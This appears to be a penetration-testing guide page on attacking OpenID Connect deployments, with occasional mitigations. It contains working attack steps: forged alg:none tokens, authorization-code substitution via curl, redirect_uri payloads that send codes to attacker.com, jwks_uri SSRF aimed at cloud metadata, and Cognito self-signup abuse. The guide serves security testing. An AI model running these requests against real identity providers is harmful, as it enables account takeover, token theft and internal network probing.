# OIDC (Open ID Connect)

OpenID Connect is an authentication layer built on OAuth 2.0. Testing focuses on token manipulation, redirect vulnerabilities, and misconfigurations.

## Common Implementations

```
- Keycloak (Red Hat)
- Okta
- Auth0
- Azure AD
- Amazon Cognito (AWS)
- Google Identity
- GitLab
- Bitbucket Server (Atlassian)
- Salesforce
```

## Discovery & Enumeration

### Well-Known Endpoints

```bash
# OIDC Configuration (always check this first)
curl https://target.com/.well-known/openid-configuration | jq

# Returns:
# - authorization_endpoint
# - token_endpoint
# - userinfo_endpoint
# - jwks_uri (JSON Web Key Set)
# - supported scopes, claims, grant types

# OAuth 2.0 Authorization Server Metadata
curl https://target.com/.well-known/oauth-authorization-server | jq

# WebFinger (for email-based discovery)
curl "https://target.com/.well-known/webfinger?resource=acct:user@target.com"
```

### Key Endpoints to Test

```bash
/authorize
/token
/userinfo
/logout
/revoke
/introspect
/.well-known/openid-configuration
/.well-known/jwks.json
```

## Token Attacks

### ID Token Manipulation

```bash
# Decode ID token (JWT)
echo "eyJhbGciOiJSUzI1NiIs..." | cut -d'.' -f2 | base64 -d | jq

# Check for weak algorithms
# Look for: alg: "none", "HS256" (when RS256 expected)

# Algorithm confusion attack
# Change RS256 to HS256 and sign with public key as secret
```

#### Real-World Exploit: alg: none Bypass (CVE-2026-28802)

A critical vulnerability was discovered in Authlib, a Python library for building OAuth and OpenID Connect servers, affecting versions 1.6.5 to 1.6.6 . The flaw allowed attackers to bypass signature verification by presenting a malicious JWT containing `alg: none` with an empty signature. The signature verification step would pass without any changes to the application code when a failure was expected. This vulnerability was patched in version 1.6.7 .

**Exploitation Steps:**
```bash
# 1. Intercept a valid ID token
# 2. Modify the JWT header
{
  "alg": "none",
  "typ": "JWT"
}

# 3. Set an empty signature (remove the signature part)
# Original: header.payload.signature
# Modified: header.payload.

# 4. Present the modified token to the OIDC provider
# The server accepts the token as valid without signature verification
```

### Token Substitution

```bash
# Use token from one client for another
# 1. Get token from client A
# 2. Present to client B's resource server
# If aud (audience) claim not validated → vulnerable
```

#### Real-World Exploit: Authorization Code Client Binding Bypass (CVE-2026-32245)

A vulnerability in Tinyauth's OIDC implementation (fixed in version 1.0.1-20260311144920-9eb2d33064b7) demonstrated a critical token substitution flaw . The token endpoint did not verify that the client exchanging an authorization code was the same client the code was issued to. A malicious OIDC client operator could exchange another client's authorization code using their own client credentials, obtaining tokens for users who never authorized their application .

**Exploitation Steps:**
```bash
# Step 1: Login as a normal user
curl -c cookies.txt -X POST http://localhost:3000/api/user/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# Step 2: Authorize with Client A and capture the authorization code
curl -b cookies.txt -X POST http://localhost:3000/api/oidc/authorize \
  -H "Content-Type: application/json" \
  -d '{"client_id":"client-a-id","redirect_uri":"http://localhost:8080/callback","response_type":"code","scope":"openid","state":"test"}'

# Step 3: Exchange Client A's code using Client B's credentials
curl -X POST http://localhost:3000/api/oidc/token \
  -u "client-b-id:client-b-secret" \
  -d "grant_type=authorization_code&code=<CODE_FROM_STEP_2>&redirect_uri=http://localhost:8080/callback"

# Server returns valid access_token, id_token, and refresh_token
# Client B now has tokens for a user who only authorized Client A
```

### Refresh Token Abuse

```bash
# Test if refresh token can be used without client_secret
curl -X POST https://target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=REFRESH_TOKEN" \
  -d "client_id=CLIENT_ID"

# Test refresh token rotation
# Can old refresh tokens still be used after rotation?
```

## Redirect URI Attacks

### Open Redirect

```bash
# Test redirect_uri manipulation
/authorize?client_id=X&redirect_uri=https://attacker.com
/authorize?client_id=X&redirect_uri=https://target.com.attacker.com
/authorize?client_id=X&redirect_uri=https://target.com%40attacker.com
/authorize?client_id=X&redirect_uri=https://target.com/callback/../../../attacker

# Bypass techniques
redirect_uri=https://target.com/callback?next=https://attacker.com
redirect_uri=https://target.com/callback#@attacker.com
redirect_uri=https://target.com/callback%0d%0aLocation:%20https://attacker.com
```

#### Real-World Exploit: Backstage OIDC Redirect URI Bypass (CVE-2026-32235)

A vulnerability in Backstage's experimental OIDC provider (versions prior to 0.27.1) allowed attackers to bypass redirect URI allowlist validation . The pattern matching implementation failed to properly account for certain URI parsing edge cases, allowing attackers to construct URIs that satisfied the allowlist pattern check but redirected to unintended destinations when processed by browsers or OAuth flows .

**Exploitation Requirements:**
- Dynamic Client Registration or Client ID Metadata Documents must be explicitly enabled (not enabled by default)
- Victim must approve the OAuth consent request

**Attack Flow:**
```bash
# 1. Attacker crafts a malicious redirect URI that passes validation
# Example bypass patterns:
# - evil.target.com (subdomain)
# - target.com.evil.com (prefix match)
# - target.com/callback/../../../steal (path traversal)
# - attacker@target.com (@ confusion)

# 2. Send crafted authorization URL to victim
https://target.com/authorize?client_id=X&redirect_uri=https://attacker.com/steal

# 3. Victim approves OAuth consent
# 4. Authorization code sent to attacker-controlled host
# 5. Attacker exchanges code for valid access token
```

#### Real-World Exploit: Keycloak Wildcard Redirect URI Bypass (CVE-2026-3872)

Keycloak was found vulnerable to an authentication bypass where attackers could bypass redirect URI validation in configurations using wildcard patterns . The path validation logic contained a flaw allowing an attacker who controlled another path on the same web server to bypass the allowed path in redirect URIs that used a wildcard .

**Vulnerable Configuration Example:**
```bash
# Client configured with wildcard pattern
redirect_uris: ["https://*.example.com/*"]

# Attacker crafts URI that matches wildcard but redirects to malicious path
https://keycloak.example.com/auth/realms/master/protocol/openid-connect/auth?
  client_id=victim-client&
  redirect_uri=https://trusted.example.com/malicious-path&
  response_type=code
```

**Mitigation:**
```bash
# Replace wildcard patterns with explicit redirect URIs
./kcadm.sh update clients/CLIENT_ID -r your-realm \
  -s 'redirectUris=["https://app.example.com/callback"]'
```

### Token Leakage via Redirect

```bash
# If token in URL fragment, test for:
# 1. Open redirect to leak fragment
# 2. Referrer header leakage
# 3. History API access
```

## SSRF via OIDC

```bash
# Test URI parameters for SSRF
redirect_uri=http://169.254.169.254/
redirect_uri=http://localhost:8080/
jwks_uri=http://internal-server/jwks.json

# Metadata URL manipulation (for dynamic client registration)
curl -X POST https://target.com/register \
  -H "Content-Type: application/json" \
  -d '{"redirect_uris":["http://attacker.com"],"jwks_uri":"http://internal:8080"}'
```

#### Real-World Exploit: Keycloak SSRF via jwks_uri (CVE-2026-1180)

A flaw in Keycloak's OpenID Connect Dynamic Client Registration feature allowed clients to specify an arbitrary `jwks_uri`, which Keycloak then retrieved without validating the destination . This enabled attackers to coerce the Keycloak server into making HTTP requests to internal or restricted network resources, allowing probing of internal services and cloud metadata endpoints .

**Exploitation Steps:**
```bash
# 1. Register a malicious client with arbitrary jwks_uri
curl -X POST https://keycloak.example.com/auth/realms/master/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "malicious-client",
    "client_secret": "generated-secret",
    "token_endpoint_auth_method": "private_key_jwt",
    "jwks_uri": "http://169.254.169.254/latest/meta-data/"
  }'

# 2. Keycloak server fetches from the attacker-specified URI
# 3. Internal metadata exposed to attacker
```

## State & Nonce Bypass

```bash
# Missing state parameter (CSRF)
# Remove state from authorization request
/authorize?client_id=X&redirect_uri=Y  # No state → CSRF possible

# State not bound to session
# Reuse state value from another session

# Missing nonce (replay attacks)
# Remove nonce from implicit flow requests
```

#### Real-World Exploit: Sigstore CSRF via State Validation Bypass (CVE-2026-24408)

Sigstore's Python OAuth flow was vulnerable to CSRF because the `state` parameter was not validated in the OpenID response . This allowed attackers to perform cross-site request forgery attacks during the signing process, potentially tricking users into signing artifacts unintentionally.

**Exploitation Steps:**
```bash
# 1. Attacker initiates OAuth flow with their own state
# 2. Victim authenticates
# 3. Attacker uses the valid state parameter from their session
# 4. CSRF attack succeeds due to missing state validation
```

## Scope Abuse

```bash
# Request elevated scopes
/authorize?client_id=X&scope=openid+profile+email+admin+write

# Test scope escalation after consent
# Get consent for 'read', then request token with 'read write'
```

## Specific Provider Attacks

### Keycloak

```bash
# Admin console
/auth/admin/
/auth/admin/master/console/

# Realm info
/auth/realms/{realm}/.well-known/openid-configuration

# CVE-2020-1714 - Adapter token spoofing
# CVE-2020-1728 - SAML authentication bypass
```

### Azure AD (Entra ID)

```bash
# Tenant enumeration
curl https://login.microsoftonline.com/{tenant}/.well-known/openid-configuration

# Guest user abuse
# B2B guest tokens may have unexpected permissions
```

#### Real-World Exploit: Azure AD Dynamic Group Attribute Manipulation

A documented attack vector in Microsoft Entra ID (formerly Azure AD) involves exploiting dynamic group membership rules that rely on user-modifiable attributes . An attacker who can modify the attribute used in a dynamic group's rule can manipulate its membership, potentially gaining unauthorized access to sensitive resources if the group grants privileged permissions .

**Attack Scenario:**
```
1. Reconnaissance: Attacker enumerates groups and views dynamic group rules
2. Target Selection: Attacker identifies dynamic groups with sensitive permissions
3. Malicious Preparation: Attacker creates a user in their own Entra tenant whose attributes match the target group's membership rules
4. Guest Invitation: Attacker invites the malicious user as a guest into the target tenant
5. Rule Exploitation: When the malicious guest accepts the invitation, their account is created with attributes matching the rule
6. Escalation: The malicious guest automatically joins the dynamic group and inherits its permissions
```

**Mitigation:**
```bash
# Exclude guest accounts from dynamic group membership
# Add to rule: and (user.userType -ne "Guest")
```

### AWS Cognito

```bash
# User pool info
curl https://cognito-idp.{region}.amazonaws.com/{userPoolId}/.well-known/openid-configuration

# Test for self-registration if enabled
# Check attribute-based access control bypass
```

#### Real-World Exploit: AWS Cognito Unintended Signup Paths

Amazon Cognito User Pools can be misconfigured to allow unintended self-signup even when administrators believe they have restricted user creation . The issue arises because the app client (client ID) used for authentication cannot control signup permissions independently. If self-signup is enabled at the user pool level, any app client can be used to register new users, bypassing intended administrative controls .

**Exploitation:**
```bash
# Attacker can self-register even if signup should be admin-only
CLIENT_ID="xxxxxxxxxxxxxxxxxxxxxxxxxx"
USER_NAME="attacker"
PASSWORD="P4ssW0rD"
ATTRIBUTES="[]"

aws cognito-idp sign-up \
  --client-id $CLIENT_ID \
  --username $USER_NAME \
  --password $PASSWORD \
  --user-attributes $ATTRIBUTES \
  --no-sign-request
```

**Mitigation:** Disable self-signup at the user pool level or use custom attributes to distinguish admin-created accounts from user-created ones.

## Automated Testing Tools

### OAUTH-Flow-Analyzer

The OAUTH-Flow-Analyzer tool provides comprehensive automated testing for OAuth 2.0 and OIDC vulnerabilities :

```bash
# Full authenticated scan
python3 oauth_analyzer.py \
  --token "https://target.com/oauth/token" \
  --userinfo "https://target.com/oauth/userinfo" \
  --client-id "my_client_id" \
  --client-secret "my_secret" \
  --redirect-uri "https://target.com/callback" \
  --code "AUTH_CODE_FROM_BROWSER" \
  --id-token "eyJ..." \
  --refresh-token "REFRESH_TOKEN" \
  --attacker "your-server.com" \
  --report
```

**Attack Coverage Categories :**

| Category | Checks |
|----------|--------|
| **State Parameter** | Missing state, reuse/replay, XSS via state, callback validation |
| **redirect_uri** | 15+ bypass techniques — open redirect, path traversal, subdomain, @-confusion, null byte, port, scheme |
| **Token Leakage** | Implicit flow abuse, PKCE downgrade, code reuse, response_mode=query |
| **Scope / Grant Abuse** | 40+ hidden scope probes, ROPC enabled, client_credentials without secret, refresh scope escalation |
| **OIDC** | UserInfo unauth, alg:none id_token, nonce missing, claim analysis, email_verified bypass |

### JWT Testing Tools

```bash
# JWT testing
jwt_tool TOKEN -T  # Tamper mode
jwt_tool TOKEN -C -d wordlist.txt  # Crack secret

# Burp extensions
# - JSON Web Tokens
# - OAuth 2.0 Scanner
# - SAML Raider (for SAML/OIDC hybrid)

# OIDC testing
# https://github.com/AhmedMohamedDev/oidc-bash-client
```

## Related Topics

* [OAuth](https://www.pentest-book.com/enumeration/webservices/oauth) - OIDC is built on OAuth 2.0
* [JWT](https://www.pentest-book.com/enumeration/webservices/jwt) - ID tokens are JWTs
* [SSRF](https://www.pentest-book.com/enumeration/web/ssrf) - URI parameters can be SSRF vectors
